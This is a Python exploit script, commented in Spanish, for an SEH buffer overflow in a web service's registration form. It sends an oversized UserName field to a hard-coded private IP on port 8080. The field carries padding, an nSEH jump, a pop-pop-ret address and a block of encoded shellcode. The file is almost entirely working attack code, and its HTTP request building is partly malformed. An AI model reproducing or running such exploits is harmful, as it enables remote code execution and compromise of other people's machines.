#!/usr/bin/python

import socket, sys
from struct import pack
# \x00\x0a\x0d\x20\x25
def explotacion():
    shellcode=("\xb8\x69\x87\x20\x81\xd9\xce\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x43\x12\x03\x43\x12\x83\x82\x7b\xc2\x74\xa8\x6c\x81"
"\x77\x50\x6d\xe6\xfe\xb5\x5c\x26\x64\xbe\xcf\x96\xee\x92\xe3"
"\x5d\xa2\x06\x77\x13\x6b\x29\x30\x9e\x4d\x04\xc1\xb3\xae\x07"
"\x41\xce\xe2\xe7\x78\x01\xf7\xe6\xbd\x7c\xfa\xba\x16\x0a\xa9"
"\x2a\x12\x46\x72\xc1\x68\x46\xf2\x36\x38\x69\xd3\xe9\x32\x30"
"\xf3\x08\x96\x48\xba\x12\xfb\x75\x74\xa9\xcf\x02\x87\x7b\x1e"
"\xea\x24\x42\xae\x19\x34\x83\x09\xc2\x43\xfd\x69\x7f\x54\x3a"
"\x13\x5b\xd1\xd8\xb3\x28\x41\x04\x45\xfc\x14\xcf\x49\x49\x52"
"\x97\x4d\x4c\xb7\xac\x6a\xc5\x36\x62\xfb\x9d\x1c\xa6\xa7\x46"
"\x3c\xff\x0d\x28\x41\x1f\xee\x95\xe7\x54\x03\xc1\x95\x37\x4c"
"\x26\x94\xc7\x8c\x20\xaf\xb4\xbe\xef\x1b\x52\xf3\x78\x82\xa5"
"\xf4\x52\x72\x39\x0b\x5d\x83\x10\xc8\x09\xd3\x0a\xf9\x31\xb8"
"\xca\x06\xe4\x6f\x9a\xa8\x57\xd0\x4a\x09\x08\xb8\x80\x86\x77"
"\xd8\xab\x4c\x10\x73\x56\x07\xdf\x2c\x28\x7f\xb7\x2e\xc8\x6e"
"\x89\xa6\x2e\xfa\x19\xef\xf9\x93\x80\xaa\x71\x05\x4c\x61\xfc"
"\x05\xc6\x86\x01\xcb\x2f\xe2\x11\xbc\xdf\xb9\x4b\x6b\xdf\x17"
"\xe3\xf7\x72\xfc\xf3\x7e\x6f\xab\xa4\xd7\x41\xa2\x20\xca\xf8"
"\x1c\x56\x17\x9c\x67\xd2\xcc\x5d\x69\xdb\x81\xda\x4d\xcb\x5f"
"\xe2\xc9\xbf\x0f\xb5\x87\x69\xf6\x6f\x66\xc3\xa0\xdc\x20\x83"
"\x35\x2f\xf3\xd5\x39\x7a\x85\x39\x8b\xd3\xd0\x46\x24\xb4\xd4"
"\x3f\x58\x24\x1a\xea\xd8\x54\x51\xb6\x49\xfd\x3c\x23\xc8\x60"
"\xbf\x9e\x0f\x9d\x3c\x2a\xf0\x5a\x5c\x5f\xf5\x27\xda\x8c\x87"
"\x38\x8f\xb2\x34\x38\x9a")
    
 
    offset=221-4
    buffer="A"*offset
    buffer+="\xeb\x06\x90\x90" #nSEH
    buffer+=pack("<L",0x10018c94) # pop edi # pop esi # ret 0x04
    buffer+="\x90"*4
    buffer+=shellcode
    buffer+="D"*50
    
    
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.112.138',8080))
        request = "POST /registresult.htm HTTP/1.1\r\n\r\n"
        request += "Host: 192.168.1.11:8080" 
        request += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0" 
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
        request += "Accept-Language: en-US,en;q=0.5" 
        request += "Accept-
        Encoding: gzip, deflate" 
        request += "Referer: http://192.168.1.11:8080/register.ghp" 
        request += "Connection: close"
        request += "Content-Type: application/x-www-form-urlencoded" 
        request += "UserName=" + buffer +"&Password=test&Password1=test&Sex=1&Email=x@&Icon=x.gif&Resume=xxxx&cw=1&RoomID=4&RepUserName=admin&submit1=Register"
        s.send(request)
        data = s.recv(4096)
        print(data)
        s.close()
    except:
        print("\n[!] Ha ocurrido un error en la conexion\n")
        sys.exit(1)
    
        
    
if __name__=="__main__":
    explotacion()